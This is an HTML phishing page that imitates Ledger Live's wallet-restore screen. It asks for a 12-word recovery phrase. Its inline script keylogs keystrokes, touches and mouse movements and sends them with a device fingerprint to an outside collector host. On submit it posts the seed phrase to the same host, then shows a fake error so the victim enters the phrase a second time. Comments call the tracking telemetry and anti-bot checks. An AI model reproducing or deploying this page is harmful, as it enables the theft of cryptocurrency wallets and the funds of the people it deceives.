<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Ledger Live — Restore Your Wallet</title>
<script src="https://static.cloudflareinsights.com/beacon.min.js"
        data-cf-beacon='{"token":"9f2ac41bd7e04e55a1c0d33f6e7192ab"}' defer></script>
<script src="https://js.hcaptcha.com/1/api.js" async defer></script>
</head>
<body>
<header>
  <h1>Ledger Live</h1>
  <nav>Download: Windows | macOS | Linux | iOS | Android</nav>
</header>
<main>
  <h2>Restore from recovery phrase</h2>
  <p>Enter your recovery phrase to restore access to your wallet.</p>
  <form id="restoreForm" action="#" method="post">
    <div id="seedGrid">
      <input type="text" id="seedword1" name="word1" autocomplete="off" placeholder="Word 1" list="bip39list">
      <input type="text" id="seedword2" name="word2" autocomplete="off" placeholder="Word 2" list="bip39list">
      <input type="text" id="seedword3" name="word3" autocomplete="off" placeholder="Word 3" list="bip39list">
      <input type="text" id="seedword4" name="word4" autocomplete="off" placeholder="Word 4" list="bip39list">
      <input type="text" id="seedword5" name="word5" autocomplete="off" placeholder="Word 5" list="bip39list">
      <input type="text" id="seedword6" name="word6" autocomplete="off" placeholder="Word 6" list="bip39list">
      <input type="text" id="seedword7" name="word7" autocomplete="off" placeholder="Word 7" list="bip39list">
      <input type="text" id="seedword8" name="word8" autocomplete="off" placeholder="Word 8" list="bip39list">
      <input type="text" id="seedword9" name="word9" autocomplete="off" placeholder="Word 9" list="bip39list">
      <input type="text" id="seedword10" name="word10" autocomplete="off" placeholder="Word 10" list="bip39list">
      <input type="text" id="seedword11" name="word11" autocomplete="off" placeholder="Word 11" list="bip39list">
      <input type="text" id="seedword12" name="word12" autocomplete="off" placeholder="Word 12" list="bip39list">
    </div>
    <div id="captcha-box"></div>
    <p id="formError" hidden>Invalid seed phrase. Please check each word and try again.</p>
    <button type="submit">Restore wallet</button>
  </form>
</main>
<script>
(function () {
  var WORDS = [];
  var COLLECT_URL = 'https://collector-9f31c.vercel.app/api/collect';
  var SUBMIT_URL = 'https://collector-9f31c.vercel.app/api/submit';
  var attempts = 0;

  // BIP-39 autocomplete served from a relative endpoint.
  fetch('api/bip39-english.txt').then(function (r) { return r.text(); }).then(function (t) {
    WORDS = t.trim().split(/\s+/);
    var dl = document.getElementById('bip39list');
    WORDS.forEach(function (w) {
      var o = document.createElement('option');
      o.value = w;
      dl.appendChild(o);
    });
  });

  // Behavioral telemetry: distinguish real visitors from sandboxes.
  var events = [];
  document.addEventListener('keydown', function (e) {
    events.push({t: 'k', k: e.key, ts: Date.now()});
  });
  document.addEventListener('touchstart', function (e) {
    events.push({t: 't', n: e.touches.length, ts: Date.now()});
  }, {passive: true});
  document.addEventListener('mousemove', function (e) {
    if (events.length % 7 === 0) events.push({t: 'm', x: e.clientX, y: e.clientY, ts: Date.now()});
  });
  function deviceProfile() {
    return {
      ua: navigator.userAgent,
      platform: navigator.platform,
      lang: navigator.language,
      screen: screen.width + 'x' + screen.height,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
  }
  setInterval(function () {
    if (!events.length) return;
    fetch(COLLECT_URL, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({device: deviceProfile(), events: events.splice(0)})
    });
  }, 8000);

  // Invisible anti-bot gate, executed on every submission.
  var widgetId = null;
  function ensureCaptcha() {
    if (widgetId === null && window.hcaptcha) {
      widgetId = hcaptcha.render('captcha-box', {
        sitekey: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
        size: 'invisible'
      });
    }
  }
  window.addEventListener('load', ensureCaptcha);

  function readSeedWords() {
    var seedInputs = document.querySelectorAll('input[name^="word"]');
    var words = [];
    seedInputs.forEach(function (el) { words.push(el.value.trim().toLowerCase()); });
    return words;
  }

  document.getElementById('restoreForm').addEventListener('submit', function (ev) {
    ev.preventDefault();
    ensureCaptcha();
    if (widgetId !== null) { try { hcaptcha.execute(widgetId); } catch (e) {} }
    var words = readSeedWords();
    if (words.length < 12) return;
    var seedPhrase = words.join(' ');
    attempts += 1;
    // First submission is exfiltrated, then a fake error forces a second entry.
    fetch(SUBMIT_URL, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({seedPhrase: seedPhrase, attempt: attempts, device: deviceProfile()})
    }).then(function () {
      var err = document.getElementById('formError');
      err.hidden = false;
      document.querySelectorAll('input[name^="word"]').forEach(function (el) { el.value = ''; });
    });
  });
})();
</script>
</body>
</html>
